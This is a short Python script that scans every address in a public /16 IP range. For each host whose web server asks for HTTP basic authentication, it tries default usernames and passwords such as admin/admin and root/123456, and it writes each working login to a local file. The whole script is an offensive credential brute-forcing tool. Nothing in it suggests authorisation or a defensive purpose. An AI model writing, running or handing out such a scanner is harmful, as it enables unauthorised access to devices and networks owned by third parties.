import requests
from requests.auth import HTTPBasicAuth
from ipaddress import IPv4Network

user = ['root','admin']
password = ['root','admin','123456']
ips = IPv4Network('186.192.0.0/16')
for ip in ips:
    print(ip)
    try:
        response = requests.get('http://' + str(ip), timeout=5.0)
        if response.status_code == 401:
            for u in user:
                for p in password:
                    response = requests.get('http://'+str(ip), auth=HTTPBasicAuth(u, p))
                    if response.status_code == 200:
                        f = open('database.txt','a+')
                        f.write('IP: {} User: {} Password: {}\n'.format(ip,u,p))
                        f.close()
                        break
    except requests.exceptions.ConnectionError:
        continue
    except requests.exceptions.ReadTimeout:
        continue
    except Exception:
        continue
# response = get('http://192.168.0.1', auth=HTTPBasicAuth('admin','admin'))